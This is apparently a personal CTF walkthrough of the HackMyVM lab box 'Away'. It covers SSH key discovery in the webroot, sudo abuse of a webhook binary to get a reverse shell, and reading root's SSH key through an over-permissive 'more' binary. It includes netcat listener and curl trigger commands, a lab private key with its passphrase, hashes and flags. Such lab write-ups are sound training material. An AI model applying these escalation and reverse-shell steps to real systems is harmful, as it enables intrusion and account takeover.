# BOX NAME: away

**LINK**:  https://downloads.hackmyvm.eu/away.zip

<details open="open"><summary><ins>SUMMARY</ins></summary>

```
Remote Enumeration:
    #Services:
    	Port 22 (SSH)
    	Port 80 (Web)   
    #Fuzzing:
    	N/A  
    #Initial Access:
    	SSH-keys stashed in webroot.
    
Local Enumeration:
       
    #Pivoting:
    	Manipulate Webhook binary
    #Payloads:
    	Use a system binary.    	
    #Exploits:       
    	Weak directory permissions.
        
This summary outlines the key steps and findings in the penetration test of the CTF box named Away.
```

</details>

# REMOTE ENUMERATION:

<ins>TARGET</ins>

```bash
[+] IP:        172.168.50.22 
[+] URL:       http://away.hmv
[+] FQDN:       
[+] DOMAIN:     

```

<details open="open"><summary><ins>SCANNING</ins></summary>

**nmap-scan**

```bash
└─$ sudo nmap -sV -sC $IP -oN recon/initial.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 08:52 CEST
Nmap scan report for away.hmv (172.168.50.22)
Host is up (0.0044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 f1:87:03:41:21:12:ef:80:3c:8f:07:2f:8b:3c:6e:2a (RSA)
|   256 5f:f9:ca:19:0d:74:65:2c:97:4a:36:a4:04:7c:9b:bd (ECDSA)
|_  256 39:a4:b3:38:94:c5:d2:77:07:a1:dd:b4:2f:0a:5a:44 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:B9:BB:BB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds

```

**whatweb-scan**

```bash
.

```

**nikto-scan**

```bash
.

```

**CMS (content management system)**

```
.

```

**enum4linux**

```
.

```

**Other services**

DNS, SSH, FTP, TELNET, MYSQL, PROXY, SMTP, POP, IMAP, SMTP

```
.

```</details>
<details open="open"><summary><ins>FUZZING</ins></summary>

**WEBSERVER**

```bash
.

```

# SYNOPSIS

> When we access the web-server we are met with a white page with some text. My first guess is we need to crack some hash. Or we can bruteforce ssh with login "tula". But let's keep enumerating for now.

![5eb5f3f3e374e8d371bad1ce8c0f30ec.png](../_resources/5eb5f3f3e374e8d371bad1ce8c0f30ec-1.png)

```
Login: tula 

+--[ED25519 256]--+
|  . . =+. .o..   |
|   + +.+ . .o    |
|    = + + +  o   |
|     + B + o  o  |
|      = S o  .   |
|     = + o    .  |
|    + X o    .   |
|     O O. . . .  |
|    . E+.. . .   |
+----[SHA256]-----+
```

> Upon further reading it seems this is a private key for SSH. Let's try and get that working. I've encountered errors with ssh in the past with differing key-systems. This might be a headache...

![6a515d192bbb0cb8b5cec1d2c32fd297.png](../_resources/6a515d192bbb0cb8b5cec1d2c32fd297-1.png)

> After what seemed like 5000years later I figured out this was not a key but a fingerprint for generating a ed25519 256 key. And then I gave up and looked up some hints.

```
sudo ssh-keygen -o -a 256 -t ed25519 -C "$(hostname)-$(date +'%d-%m-%Y)')"
```

![72cea6fce92ad98ef9c40bf4c16f7781.png](../_resources/72cea6fce92ad98ef9c40bf4c16f7781-1.png)

> Seriously? who puts a specially made private key in their webroot without no other indication. This is why I'm a bad hacker. I would've never thought about this...

![1b3bbcca2bea0af0ec3f6b5ac9b63070.png](../_resources/1b3bbcca2bea0af0ec3f6b5ac9b63070-1.png)

> So by converting the private-key using ssh2john I get a hash which I match on hashcat example-page to be "22921 RSA/DSA/EC/OpenSSH Private Keys ($6$)"  
> But this does not crack. I ended up grabbing a custom ruby script bruteforcing this using ssh-keygen but no luck. I ran shit for hours until I gave up again.  
> So the password is actually manually entered in the id_ed25519.pub file ... which is ALSO stored in the webroot. FML (to make sure it was even going to crack I tried it with john)  
> Atleast it does infact seem I was on the right track but with rockyou this wouldn't have cracked. And not with any other wordlist in my possession at the moment.

![235cb09525a630ae05c0a6f1afbff220.png](../_resources/235cb09525a630ae05c0a6f1afbff220-1.png)

> so after ssh into the box we find another username "lula" and our user "tula" is allowed to run a webhook bin as the user lula. So I'm guessing I'm gonna need to catch a revshell? Well anything else I've done so far has been a bust...

![413b5dd8cc15613281f83c2bb96d37f0.png](../_resources/413b5dd8cc15613281f83c2bb96d37f0-1.png)

![0c9e2528731e3090df0d10abb774bc03.png](../_resources/0c9e2528731e3090df0d10abb774bc03-1.png)

> After some research I managed to catch a revshell to user lula using the webhook binary.

![bfb103b13187ff0c3df488211a9f1b73.png](../_resources/bfb103b13187ff0c3df488211a9f1b73-1.png)

![339542d8e6a711c7da7c3f2f2dd92eae.png](../_resources/339542d8e6a711c7da7c3f2f2dd92eae-1.png)

> After some manual enumeration I pretty much came up empty handed. I started messing with a write.ul "unknown" SETUID binary but nothing. Then I ran linpeas and realized the "lula" group has access to the "more" binary owned by root. I'm guessing I'm supposed to manipulate that, somehow.

![d83187ce7d56289700663b4f2afc318f.png](../_resources/d83187ce7d56289700663b4f2afc318f-1.png)

> Said and done. First I verified I could read files from the root directory.

```
/usr/bin/more /root/.bashrc

# ~/.bashrc: executed by bash(1) for non-login shells.

# Note: PS1 and umask are already set in /etc/profile. You should not
# need this unless you want different defaults for root.
# PS1='${debian_chroot:+($debian_chroot)}\h:\w\$ '
# umask 022

# You may uncomment the following lines if you want `ls' to be colorized:
# export LS_OPTIONS='--color=auto'
# eval "$(dircolors)"
# alias ls='ls $LS_OPTIONS'
# alias ll='ls $LS_OPTIONS -l'
# alias l='ls $LS_OPTIONS -lA'
#
# Some more alias to avoid making mistakes:
# alias rm='rm -i'
# alias cp='cp -i'
# alias mv='mv -i'
```

> I then started looking for a way to read the root flag but nothing. I then remembered the start of the challenge. So I grasped for .ssh/id_ed25519. And i friggin worked. pff.

![e385a5b745c042c96dd8f768d171dc77.png](../_resources/e385a5b745c042c96dd8f768d171dc77-1.png)  
![79105f77b6608e70cfe337b61c43c3cc.png](../_resources/79105f77b6608e70cfe337b61c43c3cc-1.png)

> I found this box tricky and unlikely. Pissed me off I had to go trough a walkthrough initially to find the IA path. Otherwise, meh. Pretty cool using the webhook bin to run a script-file and reverse shell.

</details>

# ACTIVE DIRECTORY:

<details open="open"><summary><ins>STRATEGY/METHODOLOGY</ins></summary>

**N/A**

</details>

# LOCAL ENUMERATION:

<details open="open"><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:

```
/usr/bin/more
```

**SUID's**:

```
tula@away:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/newgrp

```

**SGID's**:

```
tula@away:~$ find / -perm -g=s -type f 2>/dev/null
/usr/sbin/unix_chkpwd
/usr/bin/expiry
/usr/bin/crontab
/usr/bin/write.ul
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/wall
/usr/bin/ssh-agent

```

**OTHERS**:

```
.

```</details>

# LOOT

<details open="open"><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**  
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```bash
/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3313b4cb119dcce16927a9b6cc61dcd97dfc4d59, for GNU/Linux 3.2.0, stripped


No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye


Linux away 5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09) x86_64 GNU/Linux
```

</details><details open="open"><summary><ins>CREDS:</ins></summary>

**username:password**

```bash
tula:Theclockisticking (SSH)
lula:N/A

```

**hashes**

```bash
ed25519:$sshng$6$16$3e198faa69d303914ff23076a6ddb99d$306$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000103e198faa69d303914ff23076a6ddb99d0000001000000001000000330000000b7373682d65643235353139000000208a417e7c121b65d95c54ec611e868356a903e92e4a076d4e4aeb86182c91225f000000b0011bb7a7d15107e46060c27406bfcce069894b80575906883b37175803f32f94c5e45dcfa810c5b1c0639deb136e5837eb756e69791ae34cc7df422c0a4040232079e3e27c557eb768119da3041919dfe2ed517ccdb45faad161d29e40a1f0ac4e5bfe6e3180a0b916f29f886112aa2ad0d973d666739f6dc35cf9ccecbadf2df2ffb37e5918a3598ed4ce156bd8be3a2a609e838991d341fa6771d9fed8134956a0776dffb2951b978307dd16ac9645$16$130


-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA+GY+qad
MDkU/yMHam3bmdAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTs
YR6Gg1apA+kuSgdtTkrrhhgskSJfAAAAsAEbt6fRUQfkYGDCdAa/zOBpiUuAV1kGiDs3F1
gD8y+UxeRdz6gQxbHAY53rE25YN+t1bml5GuNMx99CLApAQCMgeePifFV+t2gRnaMEGRnf
4u1RfM20X6rRYdKeQKHwrE5b/m4xgKC5FvKfiGESqirQ2XPWZnOfbcNc+czsut8t8v+zfl
kYo1mO1M4Va9i+OipgnoOJkdNB+mdx2f7YE0lWoHdt/7KVG5eDB90WrJZF
-----END OPENSSH PRIVATE KEY-----


ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTsYR6Gg1apA+kuSgdtTkrrhhgskSJf  My passphrase is: Theclockisticking
```

</details>

# PROOFS

<details open="open"><summary><ins>INITAL ACCESS</ins></summary>

```bash
CODE:
ssh -i id_ed25519 tula@$IP <enterpassword>
ssh -i root_ed25519 root@$IP <no password to enter>
```

</details><details open="open"><summary><ins>PIVOTING OR PRIVILEGE ESCALATION</ins></summary>

```bash
#Start a webhook listener on the vitcim machine.
sudo -u lula /usr/bin/webhook -ip 172.168.50.22 -port 6666

#Execute the hook from attacker machine.
curl $URL:6666/pwn-hook

#Catch the revshell
nc -lnvp 9999

BINGO!
```

</details><details open="open"><summary><ins>FLAGS</ins></summary>

```bash
tula:user.txt "HMVDULEMISPLCYDKEG
lula:user.txt "N/A"
root:ro0t.txt "HMVNYDWAPOQNDYUBNI"
```

</details>